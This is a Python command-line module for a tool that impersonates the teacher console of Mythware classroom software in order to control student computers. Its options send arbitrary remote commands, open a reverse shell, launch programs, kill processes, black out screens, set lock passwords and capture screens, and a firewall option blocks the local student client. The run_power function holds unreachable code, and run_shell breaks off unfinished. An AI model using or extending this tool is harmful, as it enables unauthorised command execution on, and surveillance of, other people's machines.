"""命令行参数解析与命令分发。"""

import argparse
import sys
from os import system
from pathlib import Path
from queue import Empty, Queue
from threading import Thread
from time import sleep

from ..core import (
    FIREWALL_HELPER_ARGUMENT,
    LOGOFF_COMMAND,
    H264Decoder,
    ShellServer,
    appcmd,
    cli_log,
    close_window,
    close_windows,
    collect_previews,
    collect_students,
    fix_thumbnail,
    format_size,
    get_ip,
    kill_processes,
    local_ip_and_ports,
    pkg_sendlist,
    portable_cli_log_path,
    probe,
    read_message,
    remote_control,
    request_firewall_rule,
    run_app_operation,
    run_firewall_helper,
    runtime_version,
    send_chat,
    send_command,
    send_tracked,
    send_unlocks,
    split_message,
    transfer_file,
    view_screen,
)

# 按进程名或窗口标题操作前要先发现学生、拉取列表，这里的监听时长固定。
DISCOVERY_SECONDS = 8.0


def build_parser():
    """创建 CLI 参数解析器。"""
    parser = argparse.ArgumentParser(
        description="极域课堂 UDP 报文测试工具（学生端控制与教师端模拟）"
    )
    parser.add_argument(
        "-V",
        "--version",
        action="version",
        version=runtime_version(),
        help="显示版本号并退出",
    )
    parser.add_argument("-ip", type=str, help="ip 指定目标IP地址")
    parser.add_argument(
        "-p", type=int, default=4705, help="port 指定监听端口，默认端口为4705"
    )
    message_options = parser.add_mutually_exclusive_group()
    message_options.add_argument(
        "-msg", type=str, help="发送文本消息，支持多行；超长内容自动分条"
    )
    message_options.add_argument(
        "--msg-file",
        type=str,
        metavar="PATH",
        help="从 UTF-8 文件读取消息；使用 - 从标准输入读取",
    )
    message_options.add_argument(
        "--file",
        type=str,
        nargs="+",
        metavar="PATH",
        help="传送一个或多个文件、文件夹到目标电脑桌面，文件夹按原结构递归",
    )
    parser.add_argument(
        "-c", type=str, help='command命令 eg: -c   "cmd.exe /c ipconfig"'
    )
    parser.add_argument("-l", type=int, default=1, help="循环次数，默认为1")
    parser.add_argument("-t", type=int, default=22, help="循环时间间隔，默认是22秒")
    parser.add_argument(
        "--file-ip", type=str, metavar="IP", help="文件传送时发送端 IP，默认自动检测"
    )
    parser.add_argument(
        "--file-timeout",
        type=int,
        default=120,
        metavar="SECONDS",
        help="等待目标下载文件的秒数，默认 120",
    )
    parser.add_argument(
        "-e",
        type=str,
        choices=["r", "s", "l", "g", "break", "continue", "nc"],
        help=(
            "额外选项：r 重启、s 关机、l 注销、g 本机信息、"
            "break 阻断学生端、continue 恢复允许、nc 反弹终端"
        ),
    )
    parser.add_argument(
        "--power-delay",
        type=int,
        default=0,
        metavar="SECONDS",
        help="配合 -e r/-e s 的倒计时秒数，默认 0（立即执行）",
    )
    parser.add_argument(
        "--power-text",
        type=str,
        default="",
        metavar="TEXT",
        help="配合 -e r/-e s 显示在学生机上的提示文字",
    )
    parser.add_argument(
        "--power-no-force",
        action="store_true",
        help="配合 -e r/-e s 时等待程序自行退出，不强制关闭",
    )
    action_group = parser.add_mutually_exclusive_group()
    action_group.add_argument(
        "--run",
        metavar="PATH",
        help="在目标电脑上运行指定程序（应用命令 0x0F）",
    )
    action_group.add_argument(
        "--url", metavar="URL", help="在目标电脑上打开网址（应用命令 0x18）"
    )
    action_group.add_argument(
        "--mouse",
        action="store_true",
        help="打开图形界面的远程接管页：鼠标输入只能在 GUI 里转发",
    )
    action_group.add_argument(
        "--key",
        action="store_true",
        help="打开图形界面的远程接管页：键盘输入只能在 GUI 里转发",
    )
    action_group.add_argument(
        "--view-stop",
        action="store_true",
        help="打开图形界面的屏幕画面页：观看会话在窗口里关闭",
    )
    action_group.add_argument(
        "--control-stop",
        action="store_true",
        help="打开图形界面的远程接管页：解除接管在窗口里操作",
    )
    action_group.add_argument(
        "--shell",
        action="store_true",
        help="启动反弹终端：本机监听并通过远程命令让目标连回来交互",
    )
    action_group.add_argument(
        "--kill",
        metavar="PID|NAME",
        help="结束目标进程，填进程号直接下发，填进程名则先发现学生再按名匹配",
    )
    action_group.add_argument(
        "--blackscreen",
        nargs="?",
        const=10,
        type=int,
        metavar="SECONDS",
        help="黑屏并显示 SECONDS 秒后自动解除，默认 10 秒；0 表示不自动解除",
    )
    action_group.add_argument(
        "--unlock", action="store_true", help="解除目标电脑的黑屏与键鼠锁"
    )
    action_group.add_argument(
        "--exit-student", action="store_true", help="让目标电脑退出学生端"
    )
    action_group.add_argument(
        "--close-apps", action="store_true", help="关闭目标电脑上的所有程序"
    )
    action_group.add_argument(
        "--rename",
        metavar="NAME",
        help="修改目标电脑上显示的计算机名（应用命令 0x05）",
    )
    action_group.add_argument(
        "--lock-screen", action="store_true", help="锁定目标电脑的屏幕（应用命令 0x0A）"
    )
    action_group.add_argument(
        "--unlock-screen",
        action="store_true",
        help="解除目标电脑的锁屏（应用命令 0x0A，状态 0）",
    )
    action_group.add_argument(
        "--all-preview",
        nargs="?",
        const=8,
        type=int,
        metavar="SECONDS",
        help="对发现到的全部学生拉取缩略图，默认监听 8 秒",
    )
    action_group.add_argument(
        "--announce",
        nargs="?",
        const=10,
        type=int,
        metavar="SECONDS",
        help="以教师端模拟身份发送宣告并监听 SECONDS 秒，默认 10 秒",
    )
    action_group.add_argument(
        "--students",
        nargs="?",
        const=8,
        type=int,
        metavar="SECONDS",
        help="发现学生机并拉取信息、进程与窗口，默认监听 8 秒",
    )
    action_group.add_argument(
        "--preview",
        nargs="?",
        const=8,
        type=int,
        metavar="SECONDS",
        help="拉取并修正目标电脑的屏幕缩略图，默认监听 8 秒",
    )
    action_group.add_argument(
        "--view",
        nargs="?",
        const=15,
        type=int,
        metavar="SECONDS",
        help="观看目标电脑的实时画面，默认 15 秒",
    )
    action_group.add_argument(
        "--chat",
        type=str,
        metavar="TEXT",
        help="向已登录学生发送会话聊天消息（MESS 0x800）",
    )
    action_group.add_argument(
        "--kill-window",
        metavar="HWND|TITLE",
        help="关闭目标窗口：填句柄直接下发，填标题关键字则先拉取窗口列表再匹配",
    )
    action_group.add_argument(
        "--probe",
        action="store_true",
        help="探测目标电脑的屏幕传输端口是否在监听，不建立观看会话",
    )
    parser.add_argument(
        "--run-args", type=str, default="", metavar="TEXT", help="--run 的启动参数"
    )
    parser.add_argument(
        "--run-show",
        type=int,
        default=0,
        choices=[0, 1, 2],
        metavar="MODE",
        help="--run 的窗口状态：0 正常、1 最小化、2 最大化",
    )
    parser.add_argument(
        "--shell-port",
        type=int,
        default=0,
        metavar="PORT",
        help="反弹终端的本机监听端口，默认 0 表示随机",
    )
    parser.add_argument(
        "--shell-ip",
        type=str,
        default="",
        metavar="IP",
        help="写进目标连接命令的本机地址，默认自动探测",
    )
    parser.add_argument(
        "--control",
        action="store_true",
        help="配合 --view 请求接管键鼠；单独使用会打开图形界面的远程接管页",
    )
    parser.add_argument(
        "--no-lock",
        action="store_true",
        help="--blackscreen 只黑屏，不锁定键盘与鼠标",
    )
    parser.add_argument(
        "--no-auto-unlock",
        action="store_true",
        help="--blackscreen 结束后不自动解除，由 --unlock 或学生端自己计时结束",
    )
    parser.add_argument(
        "--blackout-text",
        type=str,
        default="",
        metavar="TEXT",
        help="黑屏中间显示的提示",
    )
    parser.add_argument(
        "--screen-password",
        type=str,
        default=None,
        metavar="PASSWORD",
        help="设置目标电脑的锁屏解锁密码（应用命令 0x0B），传空字符串表示清除",
    )
    parser.add_argument(
        "--lcmd",
        action="store_true",
        help="应用命令改走不带事务应答的轻量通道 LCMD",
    )
    parser.add_argument(
        "--report",
        type=int,
        default=0,
        choices=[0, 1, 2],
        metavar="KIND",
        help="--students 请求的上报类型：0 全部、1 窗口、2 进程，默认 0",
    )
    parser.add_argument(
        "--channel",
        type=int,
        default=1,
        metavar="N",
        help="教师端模拟的会话频道，默认 1",
    )
    parser.add_argument(
        "--teacher-name",
        type=str,
        default="1",
        metavar="NAME",
        help="学生端显示的教师名",
    )
    parser.add_argument(
        "--peer",
        action="append",
        default=[],
        metavar="IP",
        help="宣告时额外定向单发的地址，可重复，用于组播与广播都到不了的网段",
    )
    parser.add_argument(
        "--tcp-port",
        type=int,
        default=4806,
        metavar="PORT",
        help="学生端屏幕传输的 TCP 端口，默认 4806",
    )
    parser.add_argument(
        "--output-dir",
        type=str,
        default="",
        metavar="DIR",
        help="--preview 与 --view 保存图片的目录，默认当前目录下的 preview",
    )
    return parser


parser = build_parser()


# 只打印帮助或版本号的调用没有任何副作用，也不该在数据目录留下日志文件。
INFORMATIONAL_ARGUMENTS = ("-h", "--help", "-V", "--version")


def is_informational(arguments):
    """判断本次调用是否只是查看帮助或版本号。

    只认单独一个帮助或版本号参数；``-msg "-h"`` 这类把短横线内容当作
    参数值传进来的写法仍按普通发送处理，避免误跳过日志。

    Args:
        arguments: 命令行参数列表。

    Returns:
        bool: 只查帮助或版本号时为 ``True``。
    """
    return len(arguments) == 1 and arguments[0] in INFORMATIONAL_ARGUMENTS


def start_logging():
    """启用命令行日志；等级固定 DEBUG，文件名与界面日志分开。"""
    cli_log.configure(portable_cli_log_path())
    log = cli_log.LOG
    if log.storage_error:
        print("[-] %s" % log.storage_error)
        return log
    log.debug("命令行日志已启用", "命令行", "文件：%s" % log.path)
    return log


def create_send_packets(arguments):
    """根据 CLI 参数构造待发送的报文列表。"""
    log = cli_log.LOG
    send_list = []

    # 先统一读取消息来源，确保 -msg 与 --msg-file 的处理保持一致。
    message = read_message(arguments)
    if message:
        chunks = list(split_message(message))
        log.debug(
            "已读取消息",
            "消息",
            "字符数：%d，分条：%d" % (len(message), len(chunks)),
        )
        send_list.extend(pkg_sendlist("-msg", chunk) for chunk in chunks)

    if arguments.c:
        log.debug("已加入命令", "命令", "命令：%s" % arguments.c)
        send_list.append(pkg_sendlist("-c", arguments.c))

    # 重启与关机改走应用命令，能带上倒计时与提示文字；注销没有对应命令号，
    # 仍然用远程命令执行 shutdown /l。
    if arguments.e == "l":
        send_list.append(pkg_sendlist("-c", LOGOFF_COMMAND))

    return send_list


def run_power(arguments):
    """按 -e r/-e s 下发重启或关机应用命令。"""
    log = cli_log.LOG
    reboot = arguments.e == "r"
    name = "重启" if reboot else "关机"
    hosts = get_ip(arguments.ip)
    payload = appcmd.power_payload(
        reboot=reboot,
        delay=arguments.power_delay,
        force=not arguments.power_no_force,
        text=arguments.power_text,
    )
    print(
        "开始%s，目标 %d 个，倒计时 %d 秒%s"
        % (
            name,
            len(hosts),
            arguments.power_delay,
            "，提示文字：%s" % arguments.power_text if arguments.power_text else "",
        ),
        flush=True,
    )
    result = run_app_operation(
        hosts, payload, channel="comd", port=arguments.p, report=print
    )
    print("%s完成：%d 台目标，共发送 %d 字节" % (name, result["hosts"], result["sent"]))
    log.info(
        "%s完成" % name,
        "设备操作",
        "目标：%d 台；倒计时：%d 秒；字节：%d"
        % (result["hosts"], arguments.power_delay, result["sent"]),
    )
    return True
    log.info(
        name,
        "设备操作",
        "目标：%d 台；倒计时：%d 秒；强制：%s；字节：%d"
        % (
            result["hosts"],
            arguments.power_delay,
            not arguments.power_no_force,
            result["sent"],
        ),
    )


def single_command(arguments):
    """执行查询本机信息或切换本机防火墙规则等单项操作。"""
    log = cli_log.LOG
    if arguments.e == "g":
        try:
            ip, ports = local_ip_and_ports()
            if not ip:
                print("未能获取本机 IP 地址")
                log.warning("未能获取本机 IP 地址", "本机信息")
                return
            print("\\nYour ip addres is:" + ip)
            print("\\nYour student client possible ports are:" + ",".join(ports))
            log.info(
                "已获取本机信息", "本机信息", "IP：%s，端口：%s" % (ip, ",".join(ports))
            )
        except Exception as error:
            print("[-] %s" % error)
            log.error("获取本机信息失败", "本机信息", "异常：%r" % error)
        return

    elif arguments.e == "break":
        results = request_firewall_rule("block")
        sleep(1)
        system("cls")
        failed = any(not item["success"] for item in results)
        print(
            "[-] 部分防火墙设置失败，请检查管理员权限" if failed else "防火墙规则已阻断"
        )
        log_line = "防火墙规则已阻断" if not failed else "部分防火墙设置失败"
        log.add("WARNING" if failed else "INFO", log_line, "防火墙")
        return

    elif arguments.e == "continue":
        results = request_firewall_rule("allow")
        failed = any(not item["success"] for item in results)
        if failed:
            print("[-] 部分防火墙设置失败，请检查管理员权限")
            log.warning("部分防火墙设置失败，请检查管理员权限", "防火墙")
            return
        print("防火墙规则已恢复")
        log.info("防火墙规则已恢复", "防火墙")
        return


def run_file_transfer(arguments):
    """执行文件传送并输出传送结果。"""
    log = cli_log.LOG
    # argparse 给出的是列表；直接调用时允许传单个路径，统一成列表再下发。
    paths = arguments.file
    if isinstance(paths, (str, Path)):
        paths = [str(paths)]
    else:
        paths = [str(path) for path in paths]
    log.info("开始文件传送", "文件传送", "目标：%s" % arguments.ip)
    log.debug(
        "文件传送参数",
        "文件传送",
        "路径：%s；端口：%s；发送端：%s；超时：%s 秒"
        % (paths, arguments.p, arguments.file_ip or "自动检测", arguments.file_timeout),
    )
    result = transfer_file(
        arguments.ip,
        arguments.p,
        paths[0],
        listen_ip=arguments.file_ip,
        timeout=arguments.file_timeout,
        report=print,
        paths=paths,
    )
    log.debug(
        "文件传送完成",
        "文件传送",
        "文件：%s；数量：%s；大小：%d 字节；监听端口：%s"
        % (
            result.get("files"),
            result.get("file_count"),
            result["size"],
            result["port"] if result.get("port") is not None else "未启动",
        ),
    )
    if len(result["targets"]) == 1:
        print("文件已传送：%s（%s）" % (result["name"], format_size(result["size"])))
    else:
        print(
            "文件已传送到 %d 个目标桌面：%s（%s）"
            % (len(result["targets"]), result["name"], format_size(result["size"]))
        )
    log.info("文件已传送", "文件传送", "目标：%s" % "、".join(result["transferred"]))
    return 0


def print_delivery(outcome):
    """逐个目标输出送达判定，并给出成功与失败的数量。

    判定依据只有网络反馈：收到 ICMP 不可达说明报文没有被接收端收到，
    没有反馈只能说“未发现异常”，无法证明对方执行了命令。
    """
    log = cli_log.LOG
    for item in outcome.deliveries:
        if item.ok:
            print(
                "[成功] %s：%s（%d 个报文）" % (item.host, item.state.text, item.sent)
            )
            log.info(
                "目标送达未发现异常",
                "发送",
                "%s：%s（%d 个报文）" % (item.host, item.state.text, item.sent),
            )
        elif item.detail:
            print("[-] [失败] %s：%s（%s）" % (item.host, item.state.text, item.detail))
            log.error(
                "目标发送失败",
                "发送",
                "%s：%s（%s）" % (item.host, item.state.text, item.detail),
            )
        else:
            print("[-] [失败] %s：%s" % (item.host, item.state.text))
            log.error("目标发送失败", "发送", "%s：%s" % (item.host, item.state.text))
    total = len(outcome.deliveries)
    failed = len(outcome.failed)
    if failed:
        print("共 %d 个目标：成功 %d，失败 %d" % (total, total - failed, failed))
    else:
        print("共 %d 个目标：全部未发现异常" % total)


def log_arguments(arguments):
    """把本次参数快照写进日志，便于事后复现。"""
    cli_log.LOG.debug(
        "命令行参数",
        "命令行",
        "ip=%s；port=%s；msg=%s；msg_file=%s；file=%s；c=%s；l=%s；t=%s；e=%s；"
        "file_ip=%s；file_timeout=%s；channel=%s；report=%s；lcmd=%s"
        % (
            arguments.ip,
            arguments.p,
            arguments.msg,
            arguments.msg_file,
            arguments.file,
            arguments.c,
            arguments.l,
            arguments.t,
            arguments.e,
            arguments.file_ip,
            arguments.file_timeout,
            arguments.channel,
            arguments.report,
            arguments.lcmd,
        ),
    )


def build_action_payload(arguments):
    """按 CLI 动作参数生成应用命令负载与投递通道。

    Returns:
        tuple | None: ``(动作名, 负载, 通道, 补发负载)``；没有动作参数时为
        ``None``。补发负载仅黑屏锁键鼠使用。

    Raises:
        ValueError: 同一调用里给了多个动作参数。
    """
    if arguments.run:
        return (
            "远程运行程序",
            appcmd.run_program_payload(
                arguments.run, arguments.run_args, arguments.run_show
            ),
            _app_channel(arguments),
            None,
        )
    if arguments.url:
        url = appcmd.normalize_url(arguments.url)
        return "打开网址", appcmd.open_url_payload(url), _app_channel(arguments), None
    if arguments.kill is not None and str(arguments.kill).strip().isdigit():
        return (
            "终止进程",
            appcmd.kill_payload(process_id=int(arguments.kill)),
            "mess",
            None,
        )
    if arguments.blackscreen is not None:
        lock = not arguments.no_lock
        return (
            "黑屏并锁定键鼠" if lock else "黑屏",
            appcmd.blackscreen_mess_payload(
                lock, arguments.blackscreen, arguments.blackout_text
            ),
            "session",
            appcmd.blackscreen_payload(lock, arguments.blackscreen) if lock else None,
        )
    if arguments.unlock:
        return "解除黑屏", appcmd.unlock_payload(), "session", None
    if arguments.rename is not None:
        return (
            "修改显示名",
            appcmd.rename_payload(arguments.rename),
            _app_channel(arguments),
            None,
        )
    if arguments.lock_screen:
        return (
            "锁定屏幕",
            appcmd.lock_screen_payload(True),
            _app_channel(arguments),
            None,
        )
    if arguments.unlock_screen:
        return (
            "解除锁屏",
            appcmd.lock_screen_payload(False),
            _app_channel(arguments),
            None,
        )
    if arguments.screen_password is not None:
        return (
            "设置解锁密码",
            appcmd.unlock_password_payload(arguments.screen_password),
            _app_channel(arguments),
            None,
        )
    if arguments.exit_student:
        return (
            "退出学生端",
            appcmd.exit_student_payload(),
            _app_channel(arguments),
            None,
        )
    if arguments.close_apps:
        return (
            "关闭所有程序",
            appcmd.close_apps_payload(),
            _app_channel(arguments),
            None,
        )
    return None


def _app_channel(arguments):
    """按 ``--lcmd`` 选择应用命令通道。"""
    return "lcmd" if arguments.lcmd else "comd"


def preview_directory(arguments):
    """返回保存画面的目录，不存在时创建。"""
    target = Path(arguments.output_dir) if arguments.output_dir else Path("preview")
    target.mkdir(parents=True, exist_ok=True)
    return target


def save_frame(width, height, pixels, path):
    """把解码得到的 RGB 像素存成 PNG。

    Args:
        width: 图像宽度。
        height: 图像高度。
        pixels: RGB 三通道字节。
        path: 目标路径。
    """
    from PIL import Image

    image = Image.frombytes("RGB", (width, height), pixels)
    image.save(path)


def save_thumbnail(record, directory):
    """把一台学生的缩略图落盘，尽量同时写一份修正后的版本。"""
    data = record.get("preview")
    if not data:
        return None
    address = record.get("address", "unknown").replace(":", "_")
    raw = directory / ("%s.jpg" % address)
    raw.write_bytes(data)
    try:
        fixed = fix_thumbnail(data)
    except Exception as error:
        print("  %s 缩略图修正失败：%s（原始图片已保存）" % (address, error))
        return raw
    fixed_path = directory / ("%s_fixed.jpg" % address)
    fixed_path.write_bytes(fixed)
    return fixed_path


def run_preview(arguments):
    """拉取目标电脑的屏幕缩略图并保存到磁盘。"""
    log = cli_log.LOG
    hosts = get_ip(arguments.ip)
    directory = preview_directory(arguments)
    print(
        "正在拉取 %d 台设备的缩略图，监听 %d 秒…" % (len(hosts), arguments.preview),
        flush=True,
    )
    records = collect_previews(
        hosts,
        duration=arguments.preview,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    saved = 0
    for record in records:
        path = save_thumbnail(record, directory)
        if path is not None:
            saved += 1
            print("  已保存 %s" % path)
    print(
        "缩略图完成：%d 台收到画面，保存 %d 张到 %s" % (len(records), saved, directory)
    )
    log.info("缩略图拉取完成", "屏幕", "学生数：%d；保存：%d" % (len(records), saved))
    return True


def run_all_previews(arguments):
    """对发现到的全部学生拉取缩略图并保存。

    没有 ``-ip`` 时先宣告发现学生机，再逐个请求缩略图，等价于来源项目的
    ``all`` 命令。

    Returns:
        bool: 执行完成返回 True。

    Raises:
        ValueError: 一台学生机都没发现。
    """
    log = cli_log.LOG
    duration = arguments.all_preview
    if arguments.ip:
        hosts = get_ip(arguments.ip)
    else:
        print("正在发现学生机，监听 %d 秒…" % DISCOVERY_SECONDS, flush=True)
        found = collect_students(
            duration=DISCOVERY_SECONDS,
            channel=arguments.channel,
            teacher_name=arguments.teacher_name,
            port=arguments.p,
            report=print,
            peers=arguments.peer,
        )
        hosts = [record["address"] for record in found if record.get("address")]
        if not hosts:
            raise ValueError("没有发现任何学生机，请确认与学生端在同一网段且频道一致")
        print("已发现 %d 台学生机：%s" % (len(hosts), "、".join(hosts)), flush=True)
    directory = preview_directory(arguments)
    print(
        "正在拉取 %d 台设备的缩略图，监听 %d 秒…" % (len(hosts), duration), flush=True
    )
    records = collect_previews(
        hosts,
        duration=duration,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    saved = 0
    for record in records:
        path = save_thumbnail(record, directory)
        if path is not None:
            saved += 1
            print("  已保存 %s" % path)
    print(
        "缩略图完成：%d 台收到画面，保存 %d 张到 %s" % (len(records), saved, directory)
    )
    log.info("全员缩略图完成", "屏幕", "学生数：%d；保存：%d" % (len(records), saved))
    return True


def run_probe(arguments):
    """探测目标电脑的屏幕传输端口是否在监听。"""
    log = cli_log.LOG
    hosts = get_ip(arguments.ip)
    reachable = 0
    for host in hosts:
        ok, detail = probe(host, arguments.tcp_port)
        if ok:
            reachable += 1
            print("[可用] %s：%d 端口在监听" % (host, arguments.tcp_port))
        else:
            print(
                "[-] [不可用] %s：%s（检查学生端是否在线、端口与防火墙）"
                % (host, detail)
            )
    log.info(
        "屏幕端口探测完成",
        "教师端模拟",
        "目标：%d；可用：%d；端口：%d" % (len(hosts), reachable, arguments.tcp_port),
    )
    return True


def run_chat(arguments):
    """向已登录的学生发送会话聊天消息。"""
    log = cli_log.LOG
    hosts = get_ip(arguments.ip)
    print("正在发送聊天消息，目标 %d 个…" % len(hosts), flush=True)
    delivered = send_chat(
        hosts,
        arguments.chat,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    print("聊天消息已发送：%s" % "、".join(delivered))
    log.info("聊天消息已发送", "教师端模拟", "目标：%s" % "、".join(delivered))
    return True


def run_close_window(arguments):
    """按窗口句柄或标题关键字关闭学生机上的应用。"""
    log = cli_log.LOG
    hosts = get_ip(arguments.ip)
    target = str(arguments.kill_window).strip()
    try:
        window = int(target, 0)
    except ValueError:
        window = None
    if window is not None and window > 0:
        print("正在关闭窗口 0x%08X，目标 %d 个…" % (window, len(hosts)), flush=True)
        delivered = close_window(
            hosts,
            window,
            channel=arguments.channel,
            teacher_name=arguments.teacher_name,
            port=arguments.p,
            report=print,
        )
        print("已发出关闭指令：%s" % "、".join(delivered))
        log.info(
            "关闭应用窗口",
            "教师端模拟",
            "hwnd=0x%08X；目标：%s" % (window, "、".join(delivered)),
        )
        return True
    print("按标题关键字关闭窗口，先发现学生并拉取窗口列表…", flush=True)
    records = collect_students(
        duration=DISCOVERY_SECONDS,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    if not records:
        print("未发现学生机；请确认与学生端在同一网段，且频道一致")
        log.warning("未发现学生机", "教师端模拟", "标题关键字：%s" % target)
        return True
    matched = close_windows(
        records,
        target,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    for address, hits in matched.items():
        titles = "、".join("0x%08X %s" % (handle, title) for handle, title in hits)
        print("%s：%s" % (address, titles))
    total = sum(len(hits) for hits in matched.values())
    print("已请求关闭 %d 个窗口" % total)
    log.info(
        "关闭应用窗口",
        "教师端模拟",
        "标题关键字：%s；命中：%d" % (target, total),
    )
    return True


def run_kill_by_name(arguments):
    """按进程名结束进程：先发现学生并拉取进程列表，再逐台匹配下发。"""
    log = cli_log.LOG
    keyword = str(arguments.kill).strip()
    print("按进程名结束进程，先发现学生并拉取进程列表…", flush=True)
    records = collect_students(
        duration=DISCOVERY_SECONDS,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    if not records:
        print("未发现学生机；请确认与学生端在同一网段，且频道一致")
        log.warning("未发现学生机", "教师端模拟", "进程名：%s" % keyword)
        return True
    matched = kill_processes(
        records,
        keyword,
        channel=arguments.channel,
        teacher_name=arguments.teacher_name,
        port=arguments.p,
        report=print,
    )
    for address, hits in matched.items():
        print(
            "%s：%s" % (address, "、".join("%d %s" % (pid, name) for pid, name in hits))
        )
    total = sum(len(hits) for hits in matched.values())
    print("已请求结束 %d 个进程" % total)
    log.info("结束进程", "教师端模拟", "进程名：%s；命中：%d" % (keyword, total))
    return True


GUI_PAGES = {"control": "远程接管", "screen": "屏幕画面"}


def launch_gui(page, host=None, channel=None):
    """打开图形界面的对应页面，交互式操作交给 GUI 完成。

    Args:
        page: 页面标识，取 ``GUI_PAGES`` 的键。
        host: 预填的目标地址。
        channel: 预填的会话频道。

    Returns:
        int: 图形界面进程的退出码。
    """
    log = cli_log.LOG
    title = GUI_PAGES.get(page, page)
    print("该功能需要在图形界面里操作，正在打开“%s”页…" % title, flush=True)
    log.info("打开图形界面", "命令行", "页面：%s；目标：%s" % (title, host or "无"))
    from ..gui.app import main as run_gui

    return run_gui(page=page, target=host, channel=channel)


def run_view(arguments):
    """观看目标电脑的实时画面，按需请求远控并保存收到的帧。"""
    log = cli_log.LOG
    hosts = get_ip(arguments.ip)
    directory = preview_directory(arguments)
    for host in hosts:
        print("正在观看 %s，时长 %d 秒…" % (host, arguments.view), flush=True)
        counter = {"index": 0, "frame": 0}
        decoder = H264Decoder()

        def handle(record, address=host, counter=counter, decoder=decoder):
            """把收到的记录落盘：JPEG 原样保存，H.264 解码后存成图片。"""
            counter["index"] += 1
            sequence = counter["index"]
            kind = record.get("kind")
            payload = record.get("payload") or b""
            if kind == "jpeg":
                path = directory / ("%s_%03d.jpg" % (address, sequence))
                path.write_bytes(payload)
                print("  jpeg → %s" % path.name)
            elif kind == "h264":
                # 码流本身也留一份，方便用播放器复核解码结果。
                path = directory / ("%s_%03d.h264" % (address, sequence))
                path.write_bytes(payload)
                for width, height, pixels in decoder.decode(payload):
                    counter["frame"] += 1
                    image = directory / (
                        "%s_%03d_%03d.png" % (address, sequence, counter["frame"])
                    )
                    save_frame(width, height, pixels, image)
                    print("  h264 → %s" % image.name)

        control = None
        if arguments.control:
            control = remote_control(
                host,
                local_ip_and_ports()[0],
                mode=2,
                udp_port=arguments.p,
                report=print,
            )
            print("  已请求接管键鼠，输入端口 %d" % control.port)
        try:
            result = view_screen(
                host,
                seconds=arguments.view,
                tcp_port=arguments.tcp_port,
                channel=arguments.channel,
                report=print,
                on_record=handle,
            )
        finally:
            # 命令行没有交互界面可转发事件，接管只是为了让学生端解除锁定。
            if control is not None:
                control.close()
        print("  %s 收到 %d 条记录" % (host, result["records"]))
    log.info("屏幕观看结束", "屏幕", "目标：%d 台" % len(hosts))
    return True


def run_action(arguments):
    """执行应用命令、宣告或学生信息查询，返回是否已处理本次调用。"""
    log = cli_log.LOG
    if arguments.shell:
        return run_shell(arguments)
    if arguments.mouse or arguments.key or arguments.control_stop:
        return launch_gui("control", get_ip(arguments.ip)[0], arguments.channel)
    if arguments.view_stop:
        return launch_gui("screen", get_ip(arguments.ip)[0], arguments.channel)
    if arguments.control and arguments.view is None:
        # 接管需要持续转发键鼠事件，命令行没有输入循环，直接进图形界面。
        return launch_gui("control", get_ip(arguments.ip)[0], arguments.channel)
    if arguments.announce is not None or arguments.students is not None:
        duration = (
            arguments.announce if arguments.announce is not None else arguments.students
        )
        print("正在以教师端模拟身份发送宣告，监听 %d 秒…" % duration, flush=True)
        records = collect_students(
            duration=duration,
            channel=arguments.channel,
            teacher_name=arguments.teacher_name,
            port=arguments.p,
            report=print,
            peers=arguments.peer,
            report_kind=arguments.report,
        )
        if not records:
            print("未发现学生机；请确认与学生端在同一网段，且频道一致")
            log.warning("未发现学生机", "教师端模拟", "监听 %d 秒" % duration)
            return True
        for record in records:
            info = record.get("info") or {}
            print(
                "\n[学生] %s  %s  用户：%s  系统：%s %s  CPU：%s %s  内存：%s"
                % (
                    record.get("address", ""),
                    info.get("name", "未知"),
                    info.get("user", "未知"),
                    info.get("os", ""),
                    info.get("os_version", ""),
                    info.get("cpu_vendor", ""),
                    info.get("cpu_model", ""),
                    info.get("memory", ""),
                )
            )
            for section, label in (("processes", "进程"), ("windows", "窗口")):
                entries = record.get(section) or []
                if not entries:
                    continue
                print("  %s（%d）" % (label, len(entries)))
                for identifier, name in entries:
                    print("    %-10s %s" % (identifier, name))
        log.info("教师端模拟查询完成", "教师端模拟", "学生数：%d" % len(records))
        return True

    if arguments.all_preview is not None:
        return run_all_previews(arguments)
    if arguments.preview is not None:
        return run_preview(arguments)
    if arguments.view is not None:
        return run_view(arguments)
    if arguments.probe:
        return run_probe(arguments)
    if arguments.chat:
        return run_chat(arguments)
    if arguments.kill_window is not None:
        return run_close_window(arguments)

    if arguments.kill is not None and not str(arguments.kill).strip().isdigit():
        return run_kill_by_name(arguments)

    action = build_action_payload(arguments)
    if action is None:
        return False
    name, payload, channel, lock = action
    hosts = get_ip(arguments.ip)
    print("开始%s，目标 %d 个" % (name, len(hosts)), flush=True)
    result = run_app_operation(
        hosts,
        payload,
        channel=channel,
        port=arguments.p,
        session_channel=arguments.channel,
        report=print,
        lock_payload=lock,
    )
    print("%s完成：%d 台目标，共发送 %d 字节" % (name, result["hosts"], result["sent"]))
    log.info(
        name, "应用命令", "目标：%d 台；字节：%d" % (result["hosts"], result["sent"])
    )
    if name.startswith("黑屏") and not arguments.no_auto_unlock:
        wait_for_unlock(arguments.blackscreen, hosts, arguments)
    return True


def wait_for_unlock(seconds, hosts, arguments):
    """按秒倒计时，到时向目标发送解除黑屏。"""
    log = cli_log.LOG
    if seconds <= 0:
        # 0 表示永久黑屏，学生端不会自己解除，这里也不排定定时器。
        print("黑屏不自动解除，需要时用 --unlock 手动解除", flush=True)
        return
    print("%d 秒后自动解除黑屏，按 Ctrl+C 立即解除" % seconds, flush=True)
    try:
        for remaining in range(seconds, 0, -1):
            print("  剩余 %d 秒…" % remaining, flush=True)
            sleep(1)
    except KeyboardInterrupt:
        print("  收到中断，立即解除黑屏", flush=True)
    sent = send_unlocks(hosts, channel=arguments.channel, report=print)
    print("已解除黑屏：%d 台目标，共发送 %d 字节" % (len(hosts), sent))
    log.info("解除黑屏", "应用命令", "目标：%d 台；字节：%d" % (len(hosts), sent))


def run_shell(arguments):
    """启动反弹终端：本机监听、下发连接命令，并把本机终端接到会话上。"""
    log = cli_log.LOG
    host = get_ip(arguments.ip)[0]
